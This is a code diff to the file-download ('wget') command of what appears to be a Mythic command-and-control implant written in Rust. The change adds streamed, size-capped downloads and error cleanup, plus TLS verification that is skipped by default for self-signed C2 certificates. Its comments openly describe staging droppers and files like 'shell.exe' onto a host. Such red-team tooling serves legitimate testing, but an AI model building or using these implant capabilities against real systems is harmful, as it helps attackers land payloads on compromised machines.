@@ -1,17 +1,38 @@
 //! Download a file from a URL — cross-platform via ureq.
+//!
+//! Streams the body to disk (capped at `MAX_WGET_BYTES`) so the agent does
+//! not OOM on a runaway server, and so a 4 GiB dropper doesn't sit in RAM
+//! before the first `write`. TLS verification follows the parameter — by
+//! default we mirror `upload`'s stance and accept self-signed C2 certs, but
+//! operators can set `insecure_skip_tls_verify=false` for monitored networks.
 
 use std::path::Path;
 
 use mythic::{TaskMessage, TaskResponse};
 use serde::Deserialize;
 
-use crate::sys::network::http_request;
+use crate::sys::network::http_get_to_writer;
+
+/// Hard cap on a single wget response. Larger transfers should use a
+/// stager split into multiple wget calls. 256 MiB mirrors `upload`.
+const MAX_WGET_BYTES: u64 = 256 * 1024 * 1024;
 
 #[derive(Deserialize)]
 struct Params {
     url: String,
     #[serde(default)]
     path: String,
+    /// Optional override for the byte cap. Clamped to [1, MAX_WGET_BYTES].
+    #[serde(default)]
+    max_bytes: Option<u64>,
+    /// When true, skip TLS certificate verification (default true for
+    /// self-signed C2 certs; set false in monitored networks).
+    #[serde(default = "default_true")]
+    insecure_skip_tls_verify: bool,
+}
+
+fn default_true() -> bool {
+    true
 }
 
 /// Extract a filename from a URL path, or fall back to "download".
@@ -27,13 +48,12 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
         Err(e) => return TaskResponse::failed(task.id, &format!("wget parse error: {e}")),
     };
 
-    // 1. Download
-    let body = match http_request(&params.url, "GET", None, None, None, true) {
-        Ok(b) => b,
-        Err(e) => return TaskResponse::failed(task.id, &format!("download {} failed: {e}", params.url)),
-    };
+    let cap = params
+        .max_bytes
+        .unwrap_or(MAX_WGET_BYTES)
+        .clamp(1, MAX_WGET_BYTES);
 
-    // 2. Determine destination path
+    // 1. Determine destination path
     let dest = if params.path.is_empty() {
         let mut tmp = std::env::temp_dir();
         tmp.push(filename_from_url(&params.url));
@@ -45,24 +65,59 @@ pub fn handle(task: &TaskMessage) -> TaskResponse {
     // Create parent dirs
     if let Some(parent) = dest.parent() {
         if !parent.as_os_str().is_empty() {
-            let _ = std::fs::create_dir_all(parent);
+            if let Err(e) = std::fs::create_dir_all(parent) {
+                return TaskResponse::failed(
+                    task.id,
+                    &format!("create parent dir {} failed: {e}", parent.display()),
+                );
+            }
         }
     }
 
-    // 3. Write file
-    match std::fs::write(&dest, body.as_bytes()) {
-        Ok(_) => TaskResponse {
-            task_id: task.id,
-            completed: Some(true),
-            status: Some("completed".into()),
-            user_output: Some(format!(
-                "downloaded {} → {} ({} bytes)",
-                params.url,
-                dest.display(),
-                body.len()
-            )),
-            ..Default::default()
-        },
-        Err(e) => TaskResponse::failed(task.id, &format!("write {} failed: {e}", dest.display())),
+    // 2. Stream the body to disk. If the response fails midway, clean up
+    //    the partial file so we don't leave a 0-byte artifact named
+    //    "shell.exe" lying around.
+    let file = match std::fs::File::create(&dest) {
+        Ok(f) => f,
+        Err(e) => return TaskResponse::failed(task.id, &format!("create {} failed: {e}", dest.display())),
+    };
+    let mut writer = std::io::BufWriter::new(file);
+
+    let result = http_get_to_writer(
+        &params.url,
+        None,
+        None,
+        params.insecure_skip_tls_verify,
+        cap,
+        &mut writer,
+    );
+    let n = match result {
+        Ok(n) => n,
+        Err(e) => {
+            // Best-effort: remove the partial file.
+            let _ = std::fs::remove_file(&dest);
+            return TaskResponse::failed(
+                task.id,
+                &format!("download {} failed: {e}", params.url),
+            );
+        }
+    };
+
+    if let Err(e) = std::io::Write::flush(&mut writer) {
+        let _ = std::fs::remove_file(&dest);
+        return TaskResponse::failed(task.id, &format!("flush {} failed: {e}", dest.display()));
+    }
+
+    TaskResponse {
+        task_id: task.id,
+        completed: Some(true),
+        status: Some("completed".into()),
+        user_output: Some(format!(
+            "downloaded {} → {} ({} bytes)",
+            params.url,
+            dest.display(),
+            n
+        )),
+        ..Default::default()
     }
 }
